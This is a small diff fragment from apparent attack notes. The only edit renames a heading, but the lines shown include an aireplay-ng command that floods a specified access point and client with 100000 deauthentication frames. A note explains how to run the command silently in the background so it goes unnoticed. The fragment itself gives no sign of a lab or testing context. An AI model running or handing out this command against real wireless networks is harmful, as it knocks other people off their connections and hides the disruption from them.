@@ -14,7 +14,7 @@ aireplay-ng --deauth 100000 -a 20:4E:7F:96:16:AA -c 00:C0:CA:96:85:27 wlan0mon
 3.
 
 
-2a.
+2a_.
 To run silently in the background,              redirect &> /dev/null &
 aireplay-ng --deauth 100000 -a 20:4E:7F:96:16:AA -c 00:C0:CA:96:85:27 wlan0mon &> /dev/null &
 to stop it either run
